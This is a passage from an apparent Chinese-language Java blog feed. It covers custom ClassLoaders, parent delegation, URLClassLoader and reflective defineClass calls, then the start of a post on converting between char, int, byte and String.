搜索类的算法。</p><p>步骤：</p><ol><li>编写一个类继承自ClassLoader抽象类。</li><li>覆盖它的<code>findClass()</code>方法。</li><li>在<code>findClass()</code>方法中调用<code>defineClass()</code>。</li></ol><h3 id="自定义-ClassLoader-DEMO"><a href="#自定义-ClassLoader-DEMO" class="headerlink" title="自定义 ClassLoader DEMO"></a>自定义 ClassLoader DEMO</h3><p>假如我们自定义一个 classloader，我们可以编写一个测试类来说明。在当前目录下面新建一个 Hello 类。里面有个方法 sayHello，然后放入到指定目录下面，如：我当前的目录为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello! ----------&gt; DIYClassLoader"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们需要自定义一个 ClassLoader 来继承系统的 ClassLoader，命名为 DIYClassLoader 类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DIYClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String mylibPath;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DIYClassLoader</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">        mylibPath = path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        String fileName = getFileName(name);</span><br><span class="line">        File file = <span class="keyword">new</span> File(mylibPath,fileName);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            FileInputStream is = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">            ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">while</span>((len = is.read())!= -<span class="number">1</span>)&#123;</span><br><span class="line">                    bos.write(len);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span>[] data = bos.toByteArray();</span><br><span class="line">            is.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,data,<span class="number">0</span>,data.length);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取要加载 的class文件名</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getFileName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = name.lastIndexOf(<span class="string">'.'</span>);</span><br><span class="line">        <span class="keyword">if</span>(index == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> name+<span class="string">".class"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name.substring(index)+<span class="string">".class"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在需要的是写一个调用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        DIYClassLoader diyClassLoader = <span class="keyword">new</span> DIYClassLoader(<span class="string">"/path"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; c = diyClassLoader.loadClass(<span class="string">"class.name"</span>);</span><br><span class="line">            <span class="keyword">if</span> (c != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Object obj = c.newInstance();</span><br><span class="line">                    Method method = c.getDeclaredMethod(<span class="string">"sayHello"</span>, <span class="keyword">null</span>);</span><br><span class="line">                    <span class="comment">//通过反射调用Hello类的sayHello方法</span></span><br><span class="line">                    method.invoke(obj, <span class="keyword">null</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最终实现方法调用：</p><p><img src="../images/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20201106092414009.png" alt="image-20201106092414009"></p><h1 id="重要方法-loadClass"><a href="#重要方法-loadClass" class="headerlink" title="重要方法 loadClass"></a>重要方法 loadClass</h1><p>直接看源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">            <span class="comment">// 首先，检测是否已经加载</span></span><br><span class="line">            Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="comment">//父加载器不为空则调用父加载器的loadClass</span></span><br><span class="line">                        c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">//父加载器为空则调用Bootstrap Classloader</span></span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                  <span class="comment">// 如果该类未被加载，并且父类加载器也没有找到，则调用findclass</span></span><br><span class="line">                    <span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">                  </span><br><span class="line">                  <span class="comment">//！！！！！！！！！！！</span></span><br><span class="line">                    c = findClass(name);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">              <span class="comment">//需不需要连接阶段，调用resolveClass()</span></span><br><span class="line">                resolveClass(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上面是方法原型，一般实现这个方法的步骤是</p><ol><li>执行<code>findLoadedClass(String)</code>去检测这个class是不是已经加载过了，已经加载过的都应该在缓存中。</li><li>执行父加载器的<code>loadClass</code>方法。如果父加载器为空，则Bootstrap ClassLoader加载器去加载。这也解释了ExtClassLoader的parent为null,但仍然说Bootstrap ClassLoader是它的父加载器。</li><li>如果向上委托父加载器没有加载成功，则通过<code>findClass(String)</code>查找。</li></ol><p>如果class在上面的步骤中找到了，参数resolve又是true的话（上文提到的==resolveClass==，resolve参数就是表示需不需要连接阶段），那么<code>loadClass()</code>又会调用<code>resolveClass(Class)</code>这个方法去链接，来生成最终的Class对象。 </p><h1 id="类加载主要的三个阶段"><a href="#类加载主要的三个阶段" class="headerlink" title="类加载主要的三个阶段"></a>类加载主要的三个阶段</h1><ol><li><p>加载</p></li><li><p>连接</p><ul><li>验证：为了保证加载进来的字节流符合虚拟机规范，不会造成安全错误。</li><li>准备：为类变量分配内存，“预分配内存”，并且赋予初值0。</li><li>解析：将常量池中的符号引用转换为直接引用（内存块），替换为具体的内存地址或偏移量。</li></ul></li><li><p>初始化：只给static修饰的变量或者语句赋值，执行静态代码块。</p><p>如果初始化一个类的时候，其父类尚未初始化，则优先初始化其父类。</p><p>如果同时包含多个静态变量和静态代码块，则按照自上而下的顺序依次执行。</p></li></ol><h1 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h1><p>在java.net包中，JDK提供了一个更加易用的类加载器URLClassLoader，它继承了ClassLoader，能够从本地或者网络上指定的位置加载类，我们可以使用该类作为自定义的类加载器使用。</p><p>URLClassLoader是ClassLoader的子类，它用于从指向 JAR 文件和目录的 URL 的搜索路径加载类和资源。也就是说，通过URLClassLoader就可以加载指定jar中的class到内存中。<br>下面来看一个例子，在该例子中，我们要完成的工作是利用URLClassLoader加载jar并运行其中的类的某个方法。</p><p>构造方法：</p><p><code>public URLClassLoader(URL[] urls)</code>：指定要加载的类的所在地URL地址，父类加载器默认为App系统类加载器</p><p><code>public URLClassLoader(URL[] urls,ClassLoader parent)</code>：指定要加载的类的所在的URL地址，并指定父类加载器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">File file = <span class="keyword">new</span> File(jar文件全路径); </span><br><span class="line">URL url = file.toURL(); </span><br><span class="line">URLClassLoader loader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[] &#123; url &#125;); </span><br><span class="line">Class tidyClazz = loader.loadClass(所需<span class="class"><span class="keyword">class</span>的含包名的全名)</span>;</span><br></pre></td></tr></table></figure><p><img src="../images/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20201106103945821.png" alt="image-20201106103945821"></p><h1 id="Java-运行时类加载"><a href="#Java-运行时类加载" class="headerlink" title="Java 运行时类加载"></a>Java 运行时类加载</h1><p>ClassLoader.loadClass()与Class.forName()是反射用来构造类，给一个类名即可，返回值是Class。</p><p>注意一点，forName()方法会执行目标class的static代码块方法。</p><p>loadClass 应该在URLClassLoader里面用的多，这个涉及到动态加载jar包。</p><p>获取当前ClassLoader的四种方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方式一：获取当前类的 ClassLoader</span></span><br><span class="line">clazz.getClassLoader()</span><br><span class="line"><span class="comment">// 方式二：获取当前线程上下文的 ClassLoader</span></span><br><span class="line">Thread.currentThread().getContextClassLoader()</span><br><span class="line"><span class="comment">// 方式三：获取系统的 ClassLoader</span></span><br><span class="line">ClassLoader.getSystemClassLoader()</span><br><span class="line"><span class="comment">// 方式四：获取调用者的 ClassLoader</span></span><br><span class="line">DriverManager.getCallerClassLoader()</span><br></pre></td></tr></table></figure><h2 id="通过反射获取defineClass方法"><a href="#通过反射获取defineClass方法" class="headerlink" title="通过反射获取defineClass方法"></a>通过反射获取defineClass方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader.defineClass(buye[] b);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]&#123;byte[].class, int.class, int.class&#125;);</span><br><span class="line"><span class="number">2</span>. defineClassMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="number">3</span>. Class cc = (Class) defineClassMethod.invoke(<span class="keyword">new</span> ClassLoader()&#123;&#125;, classBytes, <span class="number">0</span>, classBytes.length);</span><br></pre></td></tr></table></figure><h2 id="通过反射结合Thread"><a href="#通过反射结合Thread" class="headerlink" title="通过反射结合Thread"></a>通过反射结合Thread</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. ...</span><br><span class="line"><span class="number">2</span>. ...</span><br><span class="line"><span class="number">3</span>. Class cc = (Class) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), classBytes, <span class="number">0</span>, classBytes.length);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;梦里玉人方下马，恨他天外一声鸿。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;今天来总结类加载机制。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="ClassLoader" scheme="https://0range228.github.io/tags/ClassLoader/"/>
    
  </entry>
  
  <entry>
    <title>Java数据类型转换</title>
    <link href="https://0range228.github.io/Java%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/"/>
    <id>https://0range228.github.io/Java%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</id>
    <published>2020-09-24T08:15:13.000Z</published>
    <updated>2020-10-06T02:34:17.908Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>锲而不舍，金石可镂。</p></blockquote><p>今天来梳理Java数据类型转换，这部分很杂乱，顺便总结总结API，做个笔记。</p><a id="more"></a><h1 id="类型种类"><a href="#类型种类" class="headerlink" title="类型种类"></a>类型种类</h1><p>Java提供了两个类型系统，<strong>基本类型</strong>与<strong>引用类型</strong>，使用基本类型在于效率，然而很多情况，会创建对象使用，因为对象可以做更多的功能。</p><p>如果想要我们的基本类型像对象一样操作，就可以使用基本类型对应的包装类，如下：</p><table><thead><tr><th>基本类型</th><th>对应的包装类（位于java.lang包中）</th></tr></thead><tbody><tr><td>byte</td><td>Byte</td></tr><tr><td>short</td><td>Short</td></tr><tr><td>int</td><td><strong>Integer</strong></td></tr><tr><td>long</td><td>Long</td></tr><tr><td>float</td><td>Float</td></tr><tr><td>double</td><td>Double</td></tr><tr><td>char</td><td><strong>Character</strong></td></tr><tr><td>boolean</td><td>Boolean</td></tr></tbody></table><p>经常使用的有4种基本类型：</p><ol><li>char</li><li>byte</li><li>String</li><li>int(Integer)</li></ol><p>一下主要讨论这四个类型的转换，会用到包装类。</p><h1 id="char-lt-gt-int"><a href="#char-lt-gt-int" class="headerlink" title="char &lt;-&gt; int"></a>char &lt;-&gt; int</h1><p>先看代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">65</span>;</span><br><span class="line">        System.out.println((<span class="keyword">char</span>)i);<span class="comment">//result:A</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">char</span> c = <span class="string">'A'</span>;</span><br><span class="line">        System.out.println((<span class="keyword">int</span>)c);<span class="comment">//result:65</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到，如果进行强制类型转换，char会和ASCII码进行互相转换。</p><h2 id="char-gt-int"><a href="#char-gt-int" class="headerlink" title="char -&gt; int"></a>char -&gt; int</h2><p>现在想要的是 char:’9’ -&gt; int:9</p><p><strong>转换代码</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> b = <span class="string">'4'</span>;</span><br><span class="line"><span class="keyword">int</span> numericValue = Character.getNumericValue(b);</span><br><span class="line">System.out.println(numericValue);<span class="comment">// 4 type:int</span></span><br></pre></td></tr></table></figure><h2 id="int-gt-char"><a href="#int-gt-char" class="headerlink" title="int -&gt; char"></a>int -&gt; char</h2><p>现在想要的是 int:9 -&gt; char:’9’</p><p><strong>转换代码</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a =<span class="number">4</span>;</span><br><span class="line"><span class="keyword">char</span> intValue = Character.forDigit(a,<span class="number">10</span>);</span><br><span class="line">System.out.println(intValue);<span class="comment">// 4 type:char</span></span><br></pre></td></tr></table></figure><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><p>直接将’0‘的ASCII码值加上一起转换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> c = (<span class="keyword">char</span>)(<span class="string">'0'</span> + i);</span><br></pre></td></tr></table></figure><h1 id="int-lt-gt-byte"><a href="#int-lt-gt-byte" class="headerlink" title="int &lt;-&gt; byte"></a>int &lt;-&gt; byte</h1><h2 id="int-gt-byte"><a href="#int-gt-byte" class="headerlink" title="int -&gt; byte"></a>int -&gt; byte</h2><p>会发生高位截断：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">234</span>;</span><br><span class="line"><span class="keyword">byte</span> b = (<span class="keyword">byte</span>)a;</span><br><span class="line">System.out.println(b);<span class="comment">//-22</span></span><br></pre></td></tr></table></figure><h2 id="byte-gt-int"><a href="#byte-gt-int" class="headerlink" title="byte -&gt; int"></a>byte -&gt; int</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">byteToInt</span><span class="params">(<span class="keyword">byte</span> b)</span> </span>&#123;</span><br><span class="line"><span class="comment">//Java 总是把 byte 当做有符处理；我们可以通过将其和 0xFF 进行二进制与得到它的无符值</span></span><br><span class="line"><span class="keyword">return</span> b &amp; <span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span> b = -<span class="number">22</span>;</span><br><span class="line">System.out.println(byteToInt(b));<span class="comment">//234</span></span><br></pre></td></tr></table></figure><h1 id="char-lt-gt-String"><a href="#char-lt-gt-String" class="headerlink" title="char &lt;-&gt; String"></a>char &lt;-&gt; String</h1><p>这类就很常见了。</p><h2 id="char-gt-String"><a href="#char-gt-String" class="headerlink" title="char -&gt; String"></a>char -&gt; String</h2><p>直接上API，万物<code>.valueOf()</code>转一切。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> a = <span class="string">'A'</span>;</span><br><span class="line">String s = String.valueOf(a);</span><br><span class="line">System.out.println(s);<span class="comment">//A type:String</span></span><br></pre></td></tr></table></figure><p>字符数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>[] c = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>&#125;;</span><br><span class="line">String n = String.valueOf(c);</span><br><span class="line">System.out.println(n);<span class="comment">//ABCDEFG</span></span><br></pre></td></tr></table></figure><h2 id="String-gt-char"><a href="#String-gt-char" class="headerlink" title="String -&gt; char"></a>String -&gt; char</h2><p>老熟面孔了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//n = "ABCDEFG"</span></span><br><span class="line"><span class="keyword">char</span>[] chars = n.toCharArray();</span><br><span class="line">System.out.println(Arrays.toString(chars));<span class="comment">//[A, B, C, D, E, F, G]</span></span><br></pre></td></tr></table></figure><h1 id="String-lt-gt-byte"><a href="#String-lt-gt-byte" class="headerlink" title="String &lt;-&gt;byte"></a>String &lt;-&gt;byte</h1><p>这里默认就是byte[]字节数组。</p><h2 id="String-gt-byte"><a href="#String-gt-byte" class="headerlink" title="String -&gt; byte[]"></a>String -&gt; byte[]</h2><p>直接上代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str = <span class="string">"ABCDEFG"</span>;</span><br><span class="line"><span class="keyword">byte</span>[] strbyte = str.getBytes();</span><br><span class="line">System.out.println(Arrays.toString(strbyte));<span class="comment">//[65, 66, 67, 68, 69, 70, 71]</span></span><br></pre></td></tr></table></figure><p>可以发现直接内容其实就是ASCII码。</p><h2 id="byte-gt-String"><a href="#byte-gt-String" class="headerlink" title="byte[] -&gt; String"></a>byte[] -&gt; String</h2><p>直接用String的构造方法就行，直接上：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] b= &#123;-<span class="number">60</span>,-<span class="number">29</span>,-<span class="number">70</span>,-<span class="number">61</span>,-<span class="number">93</span>,-<span class="number">84</span>,-<span class="number">42</span>,-<span class="number">48</span>,-<span class="number">71</span>,-<span class="number">6</span>,<span class="number">13</span>,<span class="number">10</span>,-<span class="number">42</span>,-<span class="number">48</span>,-<span class="number">71</span>,-<span class="number">6</span>,-<span class="number">93</span>,-<span class="number">84</span>,-<span class="number">60</span>,-<span class="number">29</span>,-<span class="number">70</span>,-<span class="number">61</span>&#125;;</span><br><span class="line">String s = <span class="keyword">new</span> String(b);</span><br><span class="line">System.out.println(s);<span class="comment">//你好，中国，中国，你好</span></span><br></pre></td></tr></table></figure><h1 id="int-lt-gt-String"><a href="#int-lt-gt-String" class="headerlink" title="int &lt;-&gt; String"></a>int &lt;-&gt; String</h1><h2 id="int-gt-String"><a href="#int-gt-String" class="headerlink" title="int[] -&gt; String"></a>int[] -&gt; String</h2><p>可以用StringBuilder，直接上：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="keyword">int</span>[] test = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; test.length; i++) &#123;</span><br><span class="line">    sb.append(test[i]);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sb.toString());<span class="comment">//122345</span></span><br></pre></td></tr></table></figure><p>要是想转换为ASCII码对应的字符串，可以这么写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="keyword">int</span>[] test = &#123;<span class="number">65</span>,<span class="number">66</span>,<span class="number">67</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; test.length; i++) &#123;</span><br><span class="line">    sb.append((<span class="keyword">char</span>)test[i]);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sb.toString());<span class="comment">//ABC</span></span><br></pre></td></tr></table></figure><h2 id="String-gt-int"><a href="#String-gt-int" class="headerlink" title="String -&gt; int[]"></a>String -&gt; int[]</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String ss = <span class="string">"12345678"</span>;</span><br><span class="line"><span class="keyword">char</span>[] cc = ss.toCharArray();</span><br><span class="line"><span class="keyword">int</span>[] tar = <span class="keyword">new</span> <span class="keyword">int</span>[ss.length()];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cc.length; i++) &#123;</span><br><span class="line">    tar[i] = Integer.parseInt(String.valueOf(cc[i]))；</span><br><span class="line">    <span class="comment">//Interger.valueOf(cc[i].toString(),2)也可以。</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(Arrays.toString(tar));<span class="comment">//[1, 2, 3, 4, 5, 6, 7, 8]</span></span><br></pre></td></tr></table></figure><h1 id="byte-lt-gt-char"><a href="#byte-lt-gt-char" class="headerlink" title="byte&lt;-&gt;char"></a>byte&lt;-&gt;char</h1><h2 